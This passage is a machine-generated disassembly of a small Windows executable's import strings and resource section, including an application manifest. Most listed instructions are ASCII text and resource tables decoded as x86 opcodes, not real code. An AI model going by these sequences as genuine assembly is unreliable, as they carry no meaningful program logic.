  40338c:	jb     0x40338e
  40338e:	or     eax,0x74654700
  403393:	inc    ebx
  403394:	jne    0x403408
  403396:	jb     0x4033fd
  403398:	outs   dx,BYTE PTR ds:[esi]
  403399:	je     0x4033eb
  40339b:	jb     0x40340c
  40339d:	arpl   WORD PTR [ebp+0x73],sp
  4033a0:	jae    0x4033eb
  4033a2:	add    BYTE PTR fs:[ecx],dl
  4033a5:	add    BYTE PTR [edi+0x65],al
  4033a8:	je     0x4033ed
  4033aa:	jne    0x40341e
  4033ac:	jb     0x403413
  4033ae:	outs   dx,BYTE PTR ds:[esi]
  4033af:	je     0x403405
  4033b1:	push   0x64616572
  4033b6:	dec    ecx
  4033b7:	add    BYTE PTR fs:[eax],al
  4033ba:	adc    al,0x0
  4033bc:	inc    edi
  4033bd:	gs je  0x403413
  4033c0:	jns    0x403435
  4033c2:	je     0x403429
  4033c4:	ins    DWORD PTR es:[edi],dx
  4033c5:	push   esp
  4033c6:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  4033cd:	ins    BYTE PTR es:[edi],dx
  4033ce:	gs push esp
  4033d0:	imul   ebp,DWORD PTR [ebp+0x65],0x47001800
  4033d7:	gs je  0x40342e
  4033da:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  4033e1:	je     0x4033e3
  4033e3:	add    BYTE PTR [ecx],dl
  4033e5:	add    BYTE PTR [ebp+0x6e],dl
  4033e8:	push   0x6c646e61
  4033ed:	gs fs inc ebp
  4033f0:	js     0x403455
  4033f2:	gs jo  0x403469
  4033f5:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  4033fc:	gs jb  0x4033ff
  4033ff:	add    BYTE PTR [eax+eax*1],cl
  403402:	inc    edi
  403403:	gs je  0x403449
  403406:	jne    0x40347a
  403408:	jb     0x40346f
  40340a:	outs   dx,BYTE PTR ds:[esi]
  40340b:	je     0x40345d
  40340d:	jb     0x40347e
  40340f:	arpl   WORD PTR [ebp+0x73],sp
  403412:	jae    0x403414
  403414:	dec    ebx
  403415:	add    BYTE PTR [ebp+eiz*2+0x72],dl
  403419:	ins    DWORD PTR es:[edi],dx
  40341a:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  403421:	outs   dx,DWORD PTR ds:[esi]
  403422:	arpl   WORD PTR [ebp+0x73],sp
  403425:	jae    0x403427
  403427:	add    BYTE PTR [ecx+0x70],ah
  40342a:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  403434:	outs   dx,DWORD PTR ds:[esi]
  403435:	jb     0x40349c
  403437:	sub    eax,0x636e7973
  40343c:	push   0x2d316c2d
  403441:	xor    ch,BYTE PTR ds:0x6c642e30
  403447:	ins    BYTE PTR es:[edi],dx
  403448:	add    BYTE PTR [eax],al
  40344a:	popa   
  40344b:	jo     0x4034b6
  40344d:	sub    eax,0x772d736d
  403452:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  403459:	sub    eax,0x636f7270
  40345e:	gs jae 0x4034d4
  403461:	je     0x4034cb
  403463:	jb     0x4034ca
  403465:	popa   
  403466:	fs jae 0x403496
  403469:	ins    BYTE PTR es:[edi],dx
  40346a:	xor    DWORD PTR ds:0x2e322d31,ebp
  403470:	fs ins BYTE PTR es:[edi],dx
  403472:	ins    BYTE PTR es:[edi],dx
  403473:	add    BYTE PTR [ecx+0x70],ah
  403476:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  403480:	outs   dx,DWORD PTR ds:[esi]
  403481:	jb     0x4034e8
  403483:	sub    eax,0x6f727265
  403488:	jb     0x4034f2
  40348a:	popa   
  40348b:	outs   dx,BYTE PTR ds:[esi]
  40348c:	fs ins BYTE PTR es:[edi],dx
  40348e:	imul   ebp,DWORD PTR [esi+0x67],0x2d316c2d
  403495:	xor    DWORD PTR ds:0x6c642e31,ebp
  40349b:	ins    BYTE PTR es:[edi],dx
  40349c:	add    BYTE PTR [eax],al
  40349e:	popa   
  40349f:	jo     0x40350a
  4034a1:	sub    eax,0x772d736d
  4034a6:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  4034ad:	sub    eax,0x7262696c
  4034b2:	popa   
  4034b3:	jb     0x40352e
  4034b5:	ins    BYTE PTR es:[edi],dx
  4034b6:	outs   dx,DWORD PTR ds:[esi]
  4034b7:	popa   
  4034b8:	fs gs jb 0x4034e9
  4034bc:	ins    BYTE PTR es:[edi],dx
  4034bd:	xor    DWORD PTR ds:0x2e302d32,ebp
  4034c3:	fs ins BYTE PTR es:[edi],dx
  4034c5:	ins    BYTE PTR es:[edi],dx
  4034c6:	add    BYTE PTR [eax],al
  4034c8:	popa   
  4034c9:	jo     0x403534
  4034cb:	sub    eax,0x772d736d
  4034d0:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  4034d7:	sub    eax,0x666f7270
  4034dc:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2d],0x312d316c
  4034e4:	sub    eax,0x6c642e30
  4034e9:	ins    BYTE PTR es:[edi],dx
  4034ea:	add    BYTE PTR [eax],al
  4034ec:	popa   
  4034ed:	jo     0x403558
  4034ef:	sub    eax,0x772d736d
  4034f4:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  4034fb:	sub    eax,0x69737973
  403500:	outs   dx,BYTE PTR ds:[esi]
  403501:	outs   dx,WORD PTR ds:[esi]
  403503:	sub    eax,0x322d316c
  403508:	sub    eax,0x6c642e31
  40350d:	ins    BYTE PTR es:[edi],dx
	...

Disassembly of section .rsrc:

00404000 <.rsrc>:
	...
  40400c:	add    DWORD PTR [eax],eax
  40400e:	add    al,0x0
  404010:	sub    BYTE PTR [ebx],al
  404012:	add    BYTE PTR [eax-0x7fffffc8],al
  404018:	add    eax,DWORD PTR [eax]
  40401a:	add    BYTE PTR [eax],al
  40401c:	push   eax
  40401d:	add    BYTE PTR [eax],al
  40401f:	or     BYTE PTR [esi],0x0
  404022:	add    BYTE PTR [eax],al
  404024:	mov    al,0x0
  404026:	add    BYTE PTR [eax+0x10],al
  40402c:	enter  0x0,0x80
  404030:	sbb    BYTE PTR [eax],al
  404032:	add    BYTE PTR [eax],al
  404034:	loopne 0x404036
  404036:	add    BYTE PTR [eax+0x0],al
	...
  404044:	add    BYTE PTR [eax],al
  404046:	add    DWORD PTR [eax],eax
  404048:	add    DWORD PTR [eax],eax
  40404a:	add    BYTE PTR [eax],al
  40404c:	clc    
  40404d:	add    BYTE PTR [eax],al
  40404f:	add    BYTE PTR [eax],0x0
	...
  40405e:	or     al,BYTE PTR [eax]
  404060:	add    DWORD PTR [eax],eax
  404062:	add    BYTE PTR [eax],al
  404064:	adc    BYTE PTR [ecx],al
  404066:	add    BYTE PTR [eax+0x2],al
  40406c:	sub    BYTE PTR [ecx],al
  40406e:	add    BYTE PTR [eax+0x3],al
  404074:	inc    eax
  404075:	add    DWORD PTR [eax],eax
  404077:	add    BYTE PTR [eax+eax*1],0x0
  40407b:	add    BYTE PTR [eax+0x1],bl
  40407e:	add    BYTE PTR [eax+0x5],al
  404084:	jo     0x404087
  404086:	add    BYTE PTR [eax+0x6],al
  40408c:	mov    BYTE PTR [ecx],al
  40408e:	add    BYTE PTR [eax+0x7],al
  404094:	mov    al,ds:0x8800001
  404099:	add    BYTE PTR [eax],al
  40409b:	add    BYTE PTR [eax+0x9800001],bh
  4040a1:	add    BYTE PTR [eax],al
  4040a3:	add    al,dl
  4040a5:	add    DWORD PTR [eax],eax
  4040a7:	or     BYTE PTR [edx],0x0
  4040aa:	add    BYTE PTR [eax],al
  4040ac:	call   0xc040b2
	...
  4040bd:	add    BYTE PTR [ecx],al
  4040bf:	add    BYTE PTR [ecx+0x1f],al
  4040c2:	add    BYTE PTR [eax],al
  4040c4:	add    BYTE PTR [edx],al
  4040c6:	add    BYTE PTR [eax+0x0],al
	...
  4040d4:	add    BYTE PTR [eax],al
  4040d6:	add    DWORD PTR [eax],eax
  4040d8:	add    DWORD PTR [eax],eax
  4040da:	add    BYTE PTR [eax],al
  4040dc:	sbb    BYTE PTR [edx],al
  4040de:	add    BYTE PTR [eax+0x0],al
	...
  4040ec:	add    BYTE PTR [eax],al
  4040ee:	add    DWORD PTR [eax],eax
  4040f0:	add    DWORD PTR [eax],eax
  4040f2:	add    BYTE PTR [eax],al
  4040f4:	xor    BYTE PTR [edx],al
  4040f6:	add    BYTE PTR [eax+0x0],al
	...
  404104:	add    BYTE PTR [eax],al
  404106:	add    DWORD PTR [eax],eax
  404108:	or     DWORD PTR [eax+eax*1],eax
  40410b:	add    BYTE PTR [eax+0x2],cl
	...
  40411e:	add    DWORD PTR [eax],eax
  404120:	or     DWORD PTR [eax+eax*1],eax
  404123:	add    BYTE PTR [eax+0x2],bl
	...
  404136:	add    DWORD PTR [eax],eax
  404138:	or     DWORD PTR [eax+eax*1],eax
  40413b:	add    BYTE PTR [eax+0x2],ch
	...
  40414e:	add    DWORD PTR [eax],eax
  404150:	or     DWORD PTR [eax+eax*1],eax
  404153:	add    BYTE PTR [eax+0x2],bh
	...
  404166:	add    DWORD PTR [eax],eax
  404168:	or     DWORD PTR [eax+eax*1],eax
  40416b:	add    BYTE PTR [eax+0x2],cl
	...
  40417d:	add    BYTE PTR [ecx],al
  40417f:	add    BYTE PTR [ecx],cl
  404181:	add    al,0x0
  404183:	add    BYTE PTR [eax+0x2],bl
	...
  404195:	add    BYTE PTR [ecx],al
  404197:	add    BYTE PTR [ecx],cl
  404199:	add    al,0x0
  40419b:	add    BYTE PTR [eax+0x2],ch
	...
  4041ad:	add    BYTE PTR [ecx],al
  4041af:	add    BYTE PTR [ecx],cl
  4041b1:	add    al,0x0
  4041b3:	add    BYTE PTR [eax+0x2],bh
	...
  4041c5:	add    BYTE PTR [ecx],al
  4041c7:	add    BYTE PTR [ecx],cl
  4041c9:	add    al,0x0
  4041cb:	add    al,cl
  4041cd:	add    al,BYTE PTR [eax]
	...
  4041db:	add    BYTE PTR [eax],al
  4041dd:	add    BYTE PTR [ecx],al
  4041df:	add    BYTE PTR [ecx],cl
  4041e1:	add    al,0x0
  4041e3:	add    al,bl
  4041e5:	add    al,BYTE PTR [eax]
	...
  4041f3:	add    BYTE PTR [eax],al
  4041f5:	add    BYTE PTR [ecx],al
  4041f7:	add    BYTE PTR [ecx],cl
  4041f9:	add    al,0x0
  4041fb:	add    al,ch
  4041fd:	add    al,BYTE PTR [eax]
	...
  40420b:	add    BYTE PTR [eax],al
  40420d:	add    BYTE PTR [ecx],al
  40420f:	add    BYTE PTR [ecx],cl
  404211:	add    al,0x0
  404213:	add    al,bh
  404215:	add    al,BYTE PTR [eax]
	...
  404223:	add    BYTE PTR [eax],al
  404225:	add    BYTE PTR [ecx],al
  404227:	add    BYTE PTR [ecx],cl
  404229:	add    al,0x0
  40422b:	add    BYTE PTR [eax],cl
  40422d:	add    eax,DWORD PTR [eax]
	...
  40423b:	add    BYTE PTR [eax],al
  40423d:	add    BYTE PTR [ecx],al
  40423f:	add    BYTE PTR [ecx],cl
  404241:	add    al,0x0
  404243:	add    BYTE PTR [eax],bl
  404245:	add    eax,DWORD PTR [eax]
  404247:	add    BYTE PTR [eax+0x66],bh
  40424a:	add    DWORD PTR [eax],eax
  40424c:	rol    BYTE PTR [eax],1
	...
  404256:	add    BYTE PTR [eax],al
  404258:	sbb    BYTE PTR [eax+0x0],cl
  40425b:	add    BYTE PTR [eax+0x6],ch
	...
  404266:	add    BYTE PTR [eax],al
  404268:	or     BYTE PTR [esi+0x0],0x0
  40426c:	call   0x404273
  404271:	add    BYTE PTR [eax],al
  404273:	add    BYTE PTR [eax],al
  404275:	add    BYTE PTR [eax],al
  404277:	add    BYTE PTR [eax+0x51],ch
  40427a:	add    BYTE PTR [eax],al
  40427c:	sub    BYTE PTR [ecx],al
	...
  404286:	add    BYTE PTR [eax],al
  404288:	nop
  404289:	push   edx
  40428a:	add    BYTE PTR [eax],al
  40428c:	test   al,0xe
	...
  404296:	add    BYTE PTR [eax],al
  404298:	cmp    BYTE PTR [ecx+0x0],ah
  40429b:	add    BYTE PTR [eax+0x8],ch
  4042a1:	add    BYTE PTR [eax],al
  4042a3:	add    BYTE PTR [eax],al
  4042a5:	add    BYTE PTR [eax],al
  4042a7:	add    al,ah
  4042a9:	imul   eax,DWORD PTR [eax],0x56800
	...
  4042b7:	add    BYTE PTR [eax+0x6f],cl
  4042ba:	add    BYTE PTR [eax],al
  4042bc:	call   0x404378
  4042c1:	add    BYTE PTR [eax],al
  4042c3:	add    BYTE PTR [eax],al
  4042c5:	add    BYTE PTR [eax],al
  4042c7:	add    BYTE PTR [eax],dh
  4042c9:	daa    
  4042ca:	add    DWORD PTR [eax],eax
  4042cc:	test   al,0x25
	...
  4042d6:	add    BYTE PTR [eax],al
  4042d8:	fmul   DWORD PTR [ecx+eax*1+0x0]
  4042dc:	test   al,0x10
	...
  4042e6:	add    BYTE PTR [eax],al
  4042e8:	sbb    BYTE PTR [ebp+0x1],0x0
  4042ec:	push   0x4
  4042f1:	add    BYTE PTR [eax],al
  4042f3:	add    BYTE PTR [eax],al
  4042f5:	add    BYTE PTR [eax],al
  4042f7:	add    al,ch
  4042f9:	popa   
  4042fa:	add    DWORD PTR [eax],eax
  4042fc:	xchg   edx,eax
	...
  404305:	add    BYTE PTR [eax],al
  404307:	add    BYTE PTR [eax-0x7fffe9e],al
  40430d:	add    eax,DWORD PTR [eax]
	...
  404317:	add    BYTE PTR [eax],dh
  404319:	inc    ebx
  40431a:	add    BYTE PTR [eax],al
  40431c:	in     al,0x4
	...
  404326:	add    BYTE PTR [eax],al
  404328:	add    eax,DWORD PTR [eax]
  40432a:	dec    ebp
  40432b:	add    BYTE PTR [ebp+0x0],dl
  40432e:	dec    ecx
  40432f:	add    BYTE PTR [edi+edi*1],bh
  404332:	js     0x4043a1
  404334:	ins    BYTE PTR es:[edi],dx
  404335:	and    BYTE PTR [esi+0x65],dh
  404338:	jb     0x4043ad
  40433a:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  404341:	xor    BYTE PTR [edx],ah
  404343:	and    BYTE PTR [ebp+0x6e],ah
  404346:	arpl   WORD PTR [edi+0x64],bp
  404349:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  404350:	inc    esi
  404351:	sub    eax,0x73202238
  404356:	je     0x4043b9
  404358:	outs   dx,BYTE PTR ds:[esi]
  404359:	fs popa 
  40435b:	ins    BYTE PTR es:[edi],dx
  40435c:	outs   dx,DWORD PTR ds:[esi]
  40435d:	outs   dx,BYTE PTR ds:[esi]
  40435e:	gs cmp eax,0x73657922
  404364:	and    bh,BYTE PTR [edi]
  404366:	ds or  eax,0x2d213c0a
  40436c:	sub    eax,0x706f4320
  404371:	jns    0x4043e5
  404373:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  40437a:	sub    DWORD PTR [eax],esp
  40437c:	dec    ebp
  40437d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404384:	je     0x4043a6
  404386:	inc    ebx
  404387:	outs   dx,DWORD PTR ds:[esi]
  404388:	jb     0x4043fa
  40438a:	outs   dx,DWORD PTR ds:[esi]
  40438b:	jb     0x4043ee
  40438d:	je     0x4043f8
  40438f:	outs   dx,DWORD PTR ds:[esi]
  404390:	outs   dx,BYTE PTR ds:[esi]
  404391:	and    BYTE PTR ds:0xa0d3e2d,ch
  404397:	cmp    al,0x61
  404399:	jae    0x40440e
  40439b:	gs ins DWORD PTR es:[edi],dx
  40439d:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4043a1:	js     0x404410
  4043a3:	ins    BYTE PTR es:[edi],dx
  4043a4:	outs   dx,BYTE PTR ds:[esi]
  4043a5:	jae    0x4043e4
  4043a7:	and    dh,BYTE PTR [ebp+0x72]
  4043aa:	outs   dx,BYTE PTR ds:[esi]
  4043ab:	cmp    dh,BYTE PTR [ebx+0x63]
  4043ae:	push   0x73616d65
  4043b3:	sub    eax,0x7263696d
  4043b8:	outs   dx,DWORD PTR ds:[esi]
  4043b9:	jae    0x40442a
  4043bb:	data16 je 0x4043eb
  4043be:	arpl   WORD PTR [edi+0x6d],bp
  4043c1:	cmp    ah,BYTE PTR [ecx+0x73]
  4043c4:	ins    DWORD PTR es:[edi],dx
  4043c5:	cs jbe 0x4043f9
  4043c8:	and    ah,BYTE PTR [eax]
  4043ca:	and    BYTE PTR [eax+0x6d],bh
  4043cd:	ins    BYTE PTR es:[edi],dx
  4043ce:	outs   dx,BYTE PTR ds:[esi]
  4043cf:	jae    0x40440b
  4043d1:	popa   
  4043d2:	jae    0x404441
  4043d4:	jbe    0x404409
  4043d6:	cmp    eax,0x6e727522
  4043db:	cmp    dh,BYTE PTR [ebx+0x63]
  4043de:	push   0x73616d65
  4043e3:	sub    eax,0x7263696d
  4043e8:	outs   dx,DWORD PTR ds:[esi]
  4043e9:	jae    0x40445a
  4043eb:	data16 je 0x40441b
  4043ee:	arpl   WORD PTR [edi+0x6d],bp
  4043f1:	cmp    ah,BYTE PTR [ecx+0x73]
  4043f4:	ins    DWORD PTR es:[edi],dx
  4043f5:	cs jbe 0x40442b
  4043f8:	and    ah,BYTE PTR [eax]
  4043fa:	ins    DWORD PTR es:[edi],dx
  4043fb:	popa   
  4043fc:	outs   dx,BYTE PTR ds:[esi]
  4043fd:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  404404:	jb     0x404479
  404406:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40440d:	xor    BYTE PTR [edx],ah
  40440f:	ds or  eax,0x73613c0a
  404415:	jae    0x40447c
  404417:	ins    DWORD PTR es:[edi],dx
  404418:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40441c:	fs outs dx,BYTE PTR gs:[esi]
  40441f:	je     0x40448a
  404421:	je     0x40449c
  404423:	or     eax,0x7270090a
  404428:	outs   dx,DWORD PTR ds:[esi]
  404429:	arpl   WORD PTR [ebp+0x73],sp
  40442c:	jae    0x40449d
  40442e:	jb     0x404471
  404430:	jb     0x404495
  404432:	push   0x63657469
  404437:	je     0x4044ae
  404439:	jb     0x4044a0
  40443b:	cmp    eax,0x36387822
  404440:	and    cl,BYTE PTR ds:0x6576090a
  404446:	jb     0x4044bb
  404448:	imul   ebp,DWORD PTR [edi+0x6e],0x2e35223d
  40444f:	xor    DWORD PTR [esi],ebp
  404451:	xor    BYTE PTR [esi],ch
  404453:	xor    BYTE PTR [edx],ah
  404455:	or     eax,0x616e090a
  40445a:	ins    DWORD PTR es:[edi],dx
  40445b:	gs cmp eax,0x63694d22
  404461:	jb     0x4044d2
  404463:	jae    0x4044d4
  404465:	data16 je 0x404496
  404468:	push   edi
  404469:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  404470:	push   ebx
  404471:	jns    0x4044e6
  404473:	je     0x4044da
  404475:	ins    DWORD PTR es:[edi],dx
  404476:	push   eax
  404477:	jb     0x4044e8
  404479:	jo     0x4044e0
  40447b:	jb     0x4044f1
  40447d:	imul   esp,DWORD PTR [ebp+0x73],0x66726550
  404484:	outs   dx,DWORD PTR ds:[esi]
  404485:	jb     0x4044f4
  404487:	popa   
  404488:	outs   dx,BYTE PTR ds:[esi]
  404489:	arpl   WORD PTR [ebp+0x22],sp
  40448c:	and    BYTE PTR [ecx+edi*2+0x70],dh
  404490:	gs cmp eax,0x6e697722
  404496:	xor    esi,DWORD PTR [edx]
  404498:	and    ah,BYTE PTR [eax]
  40449a:	das    
  40449b:	ds or  eax,0x65643c0a
  4044a1:	jae    0x404506
  4044a3:	jb     0x40450e
  4044a5:	jo     0x40451b
  4044a7:	imul   ebp,DWORD PTR [edi+0x6e],0x7379533e
  4044ae:	je     0x404515
  4044b0:	ins    DWORD PTR es:[edi],dx
  4044b1:	and    BYTE PTR [eax+0x72],dl
  4044b4:	outs   dx,DWORD PTR ds:[esi]
  4044b5:	jo     0x40451c
  4044b7:	jb     0x40452d
  4044b9:	imul   esp,DWORD PTR [ebp+0x73],0x72655020
  4044c0:	outs   dx,WORD PTR ds:[esi]
  4044c2:	jb     0x404531
  4044c4:	popa   
  4044c5:	outs   dx,BYTE PTR ds:[esi]
  4044c6:	arpl   WORD PTR [ebp+0x3c],sp
  4044c9:	das    
  4044ca:	fs gs jae 0x404531
  4044ce:	jb     0x404539
  4044d0:	jo     0x404546
  4044d2:	imul   ebp,DWORD PTR [edi+0x6e],0x3c0a0d3e
  4044d9:	fs gs jo 0x404542
  4044dd:	outs   dx,BYTE PTR ds:[esi]
  4044de:	fs outs dx,BYTE PTR gs:[esi]
  4044e1:	arpl   WORD PTR [ecx+0x3e],di
  4044e4:	or     eax,0x2020200a
  4044e9:	and    BYTE PTR [esp+eiz*2],bh
  4044ec:	gs jo  0x404554
  4044ef:	outs   dx,BYTE PTR ds:[esi]
  4044f0:	fs outs dx,BYTE PTR gs:[esi]
  4044f3:	je     0x404536
  4044f5:	jae    0x40456a
  4044f7:	gs ins DWORD PTR es:[edi],dx
  4044f9:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  4044fd:	or     eax,0x2020200a
  404502:	and    BYTE PTR [eax],ah
  404504:	and    BYTE PTR [eax],ah
  404506:	and    BYTE PTR [ecx+eiz*2],bh
  404509:	jae    0x40457e
  40450b:	gs ins DWORD PTR es:[edi],dx
  40450d:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  404511:	fs outs dx,BYTE PTR gs:[esi]
  404514:	je     0x40457f
  404516:	je     0x404591
  404518:	or     eax,0x2020200a
  40451d:	and    BYTE PTR [eax],ah
  40451f:	and    BYTE PTR [eax],ah
  404521:	and    BYTE PTR [eax],ah
  404523:	and    BYTE PTR [eax],ah
  404525:	and    BYTE PTR [ecx+edi*2+0x70],dh
  404529:	gs cmp eax,0x6e697722
  40452f:	xor    esi,DWORD PTR [edx]
  404531:	and    cl,BYTE PTR ds:0x2020200a
  404537:	and    BYTE PTR [eax],ah
  404539:	and    BYTE PTR [eax],ah
  40453b:	and    BYTE PTR [eax],ah
  40453d:	and    BYTE PTR [eax],ah
  40453f:	and    BYTE PTR [esi+0x61],ch
  404542:	ins    DWORD PTR es:[edi],dx
  404543:	gs cmp eax,0x63694d22
  404549:	jb     0x4045ba
  40454b:	jae    0x4045bc
  40454d:	data16 je 0x40457e
  404550:	push   edi
  404551:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  404558:	inc    ebx
  404559:	outs   dx,DWORD PTR ds:[esi]
  40455a:	ins    DWORD PTR es:[edi],dx
  40455b:	ins    DWORD PTR es:[edi],dx
  40455c:	outs   dx,DWORD PTR ds:[esi]
  40455d:	outs   dx,BYTE PTR ds:[esi]
  40455e:	sub    eax,0x746e6f43
  404563:	jb     0x4045d4
  404565:	ins    BYTE PTR es:[edi],dx
  404566:	jae    0x40458a
  404568:	or     eax,0x2020200a
  40456d:	and    BYTE PTR [eax],ah
  40456f:	and    BYTE PTR [eax],ah
  404571:	and    BYTE PTR [eax],ah
  404573:	and    BYTE PTR [eax],ah
  404575:	and    BYTE PTR [esi+0x65],dh
  404578:	jb     0x4045ed
  40457a:	imul   ebp,DWORD PTR [edi+0x6e],0x2e36223d
  404581:	xor    BYTE PTR [esi],ch
  404583:	xor    BYTE PTR [esi],ch
  404585:	xor    BYTE PTR [edx],ah
  404587:	or     eax,0x2020200a
  40458c:	and    BYTE PTR [eax],ah
  40458e:	and    BYTE PTR [eax],ah
  404590:	and    BYTE PTR [eax],ah
  404592:	and    BYTE PTR [eax],ah
  404594:	and    BYTE PTR [eax+0x75],dh
  404597:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  40459b:	dec    ebx
  40459c:	gs jns 0x4045f3
  40459f:	outs   dx,DWORD PTR ds:[esi]
  4045a0:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4045a4:	and    dh,BYTE PTR [esi]
  4045a6:	xor    eax,0x36623539
  4045ab:	xor    al,0x31
  4045ad:	xor    al,0x34
  4045af:	arpl   WORD PTR [ebx+0x66],sp
  4045b2:	xor    DWORD PTR [esi+eiz*2+0x22],esp
  4045b6:	or     eax,0x2020200a
  4045bb:	and    BYTE PTR [eax],ah
  4045bd:	and    BYTE PTR [eax],ah
  4045bf:	and    BYTE PTR [eax],ah
  4045c1:	and    BYTE PTR [eax],ah
  4045c3:	and    BYTE PTR [eax+0x72],dh
  4045c6:	outs   dx,DWORD PTR ds:[esi]
  4045c7:	arpl   WORD PTR [ebp+0x73],sp
  4045ca:	jae    0x40463b
  4045cc:	jb     0x40460f
  4045ce:	jb     0x404633
  4045d0:	push   0x63657469
  4045d5:	je     0x40464c
  4045d7:	jb     0x40463e
  4045d9:	cmp    eax,0x36387822
  4045de:	and    cl,BYTE PTR ds:0x2020200a
  4045e4:	and    BYTE PTR [eax],ah
  4045e6:	and    BYTE PTR [eax],ah
  4045e8:	and    BYTE PTR [edi],ch
  4045ea:	ds or  eax,0x2020200a
  4045f0:	and    BYTE PTR [edi+ebp*1],bh
  4045f3:	fs gs jo 0x40465c
  4045f7:	outs   dx,BYTE PTR ds:[esi]
  4045f8:	fs outs dx,BYTE PTR gs:[esi]
  4045fb:	je     0x40463e
  4045fd:	jae    0x404672
  4045ff:	gs ins DWORD PTR es:[edi],dx
  404601:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  404605:	or     eax,0x642f3c0a
  40460a:	gs jo  0x404672
  40460d:	outs   dx,BYTE PTR ds:[esi]
  40460e:	fs outs dx,BYTE PTR gs:[esi]
  404611:	arpl   WORD PTR [ecx+0x3e],di
  404614:	or     eax,0x72743c0a
  404619:	jne    0x40468e
  40461b:	je     0x404666
  40461d:	outs   dx,BYTE PTR ds:[esi]
  40461e:	outs   dx,WORD PTR ds:[esi]
  404620:	and    BYTE PTR [eax+0x6d],bh
  404623:	ins    BYTE PTR es:[edi],dx
  404624:	outs   dx,BYTE PTR ds:[esi]
  404625:	jae    0x404664
  404627:	and    dh,BYTE PTR [ebp+0x72]
  40462a:	outs   dx,BYTE PTR ds:[esi]
  40462b:	cmp    dh,BYTE PTR [ebx+0x63]
  40462e:	push   0x73616d65
  404633:	sub    eax,0x7263696d
  404638:	outs   dx,DWORD PTR ds:[esi]
  404639:	jae    0x4046aa
  40463b:	data16 je 0x40466b
  40463e:	arpl   WORD PTR [edi+0x6d],bp
  404641:	cmp    ah,BYTE PTR [ecx+0x73]
  404644:	ins    DWORD PTR es:[edi],dx
  404645:	cs jbe 0x40467b
  404648:	and    bh,BYTE PTR [esi]
  40464a:	or     eax,0x2020200a
  40464f:	and    BYTE PTR [ebx+esi*2],bh
  404652:	arpl   WORD PTR gs:[ebp+0x72],si
  404656:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40465e:	and    BYTE PTR [eax],ah
  404660:	and    BYTE PTR [eax],ah
  404662:	and    BYTE PTR [eax],ah
  404664:	cmp    al,0x72
  404666:	gs jno 0x4046de
  404669:	gs jae 0x4046e0
  40466c:	gs fs push eax
  40466f:	jb     0x4046da
  404671:	jbe    0x4046dc
  404673:	ins    BYTE PTR es:[edi],dx
  404674:	gs addr16 gs jae 0x4046b7
  404679:	or     eax,0x2020200a
  40467e:	and    BYTE PTR [eax],ah
  404680:	and    BYTE PTR [eax],ah
  404682:	and    BYTE PTR [eax],ah
  404684:	and    BYTE PTR [eax],ah
  404686:	and    BYTE PTR [edx+esi*2],bh
  404689:	gs jno 0x404701
  40468c:	gs jae 0x404703
  40468f:	gs fs inc ebp
  404692:	js     0x4046f9
  404694:	arpl   WORD PTR [ebp+0x74],si
  404697:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40469e:	ins    BYTE PTR es:[edi],dx
  40469f:	or     eax,0x2020200a
  4046a4:	and    BYTE PTR [eax],ah
  4046a6:	and    BYTE PTR [eax],ah
  4046a8:	and    BYTE PTR [eax],ah
  4046aa:	and    BYTE PTR [eax],ah
  4046ac:	and    BYTE PTR [eax],ah
  4046ae:	and    BYTE PTR [eax],ah
  4046b0:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  4046b4:	gs ins BYTE PTR es:[edi],dx
  4046b6:	cmp    eax,0x67696822
  4046bb:	push   0x41747365
  4046c0:	jbe    0x404723
  4046c2:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0xd22656c
  4046ca:	or     ah,BYTE PTR [eax]
  4046cc:	and    BYTE PTR [eax],ah
  4046ce:	and    BYTE PTR [eax],ah
  4046d0:	and    BYTE PTR [eax],ah
  4046d2:	and    BYTE PTR [eax],ah
  4046d4:	and    BYTE PTR [eax],ah
  4046d6:	and    BYTE PTR [eax],ah
  4046d8:	and    BYTE PTR [eax],ah
  4046da:	and    BYTE PTR [ebp+0x69],dh
  4046dd:	inc    ecx
  4046de:	arpl   WORD PTR [ebx+0x65],sp
  4046e1:	jae    0x404756
  4046e3:	cmp    eax,0x6c616622
  4046e8:	jae    0x40474f
  4046ea:	and    cl,BYTE PTR ds:0x2020200a
  4046f0:	and    BYTE PTR [eax],ah
  4046f2:	and    BYTE PTR [eax],ah
  4046f4:	and    BYTE PTR [eax],ah
  4046f6:	and    BYTE PTR [eax],ah
  4046f8:	and    BYTE PTR [edi],ch
  4046fa:	ds or  eax,0x2020200a
  404700:	and    BYTE PTR [eax],ah
  404702:	and    BYTE PTR [eax],ah
  404704:	and    BYTE PTR [edi+ebp*1],bh
  404707:	jb     0x40476e
  404709:	jno    0x404780
  40470b:	gs jae 0x404782
  40470e:	gs fs push eax
  404711:	jb     0x40477c
  404713:	jbe    0x40477e
  404715:	ins    BYTE PTR es:[edi],dx
  404716:	gs addr16 gs jae 0x404759
  40471b:	or     eax,0x2020200a
  404720:	and    BYTE PTR [edi+ebp*1],bh
  404723:	jae    0x40478a
  404725:	arpl   WORD PTR [ebp+0x72],si
